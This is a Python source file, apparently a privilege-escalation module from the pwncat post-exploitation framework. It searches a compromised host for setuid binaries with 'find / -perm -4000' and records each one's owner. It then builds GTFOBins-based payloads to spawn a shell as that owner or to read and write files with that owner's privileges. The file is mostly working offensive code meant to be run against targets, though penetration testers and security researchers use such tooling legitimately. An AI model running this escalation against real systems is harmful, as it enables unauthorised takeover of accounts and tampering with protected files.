#!/usr/bin/env python3
from typing import Generator, List, BinaryIO
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style
import io

from pwncat.privesc.base import Method, PrivescError, Technique
from pwncat.gtfobins import Binary, Stream, Capability, MethodWrapper, BinaryNotFound
from pwncat.file import RemoteBinaryPipe
from pwncat import util


class SetuidMethod(Method):

    name = "setuid"
    BINARIES = ["find", "stat"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SetuidMethod, self).__init__(pty)

        self.users_searched = []
        self.suid_paths = {}

    def find_suid(self):

        current_user = self.pty.whoami()

        # Only re-run the search if we haven't searched as this user yet
        if current_user in self.users_searched:
            return

        # Note that we already searched for binaries as this user
        self.users_searched.append(current_user)

        # Spawn a find command to locate the setuid binaries
        files = []
        with self.pty.subprocess(
            "find / -perm -4000 -print 2>/dev/null", mode="r"
        ) as stream:
            util.progress("searching for setuid binaries")
            for path in stream:
                path = path.strip().decode("utf-8")
                util.progress(
                    f"searching for setuid binaries: {os.path.basename(path)}"
                )
                files.append(path)

        util.success("searching for setuid binaries: complete", overlay=True)

        for path in files:
            user = (
                self.pty.run(f"stat -c '%U' {shlex.quote(path)}")
                .strip()
                .decode("utf-8")
            )
            if user not in self.suid_paths:
                self.suid_paths[user] = []
            # Only add new binaries
            if path not in self.suid_paths[user]:
                self.suid_paths[user].append(path)

    def enumerate(self, caps: Capability = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        # Update the cache for the current user
        self.find_suid()

        known_techniques = []
        for user, paths in self.suid_paths.items():
            for path in paths:
                try:
                    binary = self.pty.gtfo.find_binary(path, caps)
                except BinaryNotFound:
                    continue

                for method in binary.iter_methods(path, caps, Stream.ANY):
                    known_techniques.append(Technique(user, self, method, method.cap))

        return known_techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        method = technique.ident

        # Build the payload
        payload, input_data, exit_cmd = method.build(shell=self.pty.shell, suid=True)

        # Run the start commands
        self.pty.process(payload, delim=False)

        # Send required input
        self.pty.client.send(input_data.encode("utf-8"))

        return exit_cmd  # remember how to close out of this privesc

    def read_file(self, filepath: str, technique: Technique) -> BinaryIO:

        method = technique.ident

        payload, input_data, exit_cmd = method.build(lfile=filepath, suid=True)

        mode = "r"
        if method.stream is Stream.RAW:
            mode += "b"

        # Send the read payload
        pipe = self.pty.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Wrap the stream in case this is an encoded read
        pipe = method.wrap_stream(pipe)

        return pipe

    def write_file(self, filepath: str, data: bytes, technique: Technique):

        method = technique.ident

        payload, input_data, exit_cmd = method.build(
            lfile=filepath, length=len(data), suid=True
        )

        mode = "w"
        if method.stream is Stream.RAW:
            mode += "b"

        # Send the read payload
        pipe = self.pty.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Wrap the stream in case this is an encoded write
        with method.wrap_stream(pipe) as pipe:
            pipe.write(data)

    def get_name(self, tech: Technique):
        return f"{Fore.CYAN}{tech.ident.binary_path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
